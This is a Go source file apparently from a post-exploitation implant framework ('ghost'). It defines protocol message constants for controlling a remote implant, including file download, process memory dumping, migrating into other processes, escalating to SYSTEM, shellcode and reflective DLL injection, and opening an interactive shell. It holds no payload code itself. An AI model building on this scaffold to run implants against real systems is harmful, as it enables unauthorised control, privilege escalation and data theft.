package ghost

// Requests types
const (
	// Control
	Register = uint32(1 + iota) // Initial message from ghost with metadata
	Ping                        // Ping - Confirm connection is open used as req/resp
	Kill                        // Kill request to the ghost process

	// Filesystem
	LsRequest       // Request a directory listing from the remote system
	Ls              // Directory contents
	CdRequest       // Change current working directory of implant
	Cd              // Response
	PwdRequest      // Get current working dir
	Pwd             // Response
	MkdirRequest    // Make a new directory
	Mkdir           // Response
	RmRequest       // Remove file/directory
	Rm              // Response
	DownloadRequest // Request to download a file/directory from the target
	Download        // Response, with content if successful
	UploadRequest   // Upload a file/directory to the target
	Upload          // Response

	// Net
	IfConfigRequest // Request target network interfaces
	IfConfig        // Response
	NetstatRequest  // Request sockets table from the target
	Netstat         // Response

	// Proc
	PsRequest          // Request a list of running processes on the target
	Ps                 // Response
	ProcessDumpRequest // Dump memory of a process (Windows only)
	ProcessDump        // Response
	TerminateRequest   // Terminate a process running on the target
	Terminate          // Response
	MigrateRequest     // Spawn a new implant into another process (Windows only)
	Migrate            // Response

	// Priv
	RunAsRequest        // Run a program as given user
	RunAs               // Response
	ImpersonateRequest  // Impersonate a user (Windows only)
	Impersonate         // Response
	GetSystemRequest    // Elevate to NT_AUTHORITY\SYSTEM (Windows only)
	GetSystem           // Response
	ElevateRequest      // Elevate privileges of the ghost process
	Elevate             // Response
	RevertToSelfRequest // Revert back to original process owner
	RevertToSelf        // Response

	// Execute
	Task                   // A local shellcode injection task
	RemoteTask             // Remote thread injection task
	ExecuteAssemblyRequest // Request to load and execute a .NET assembly
	ExecuteAssembly        // Response
	SideloadDllRequest     // Request output of the binary
	SideloadDll            // Response with content
	SpawnDllRequest        // Reflective DLL injection request
	SpawnDll               // Reflective DLL injection output

	// Shell
	ShellRequest // Starts an interactive shell
	Shell        // Response on starting shell
)
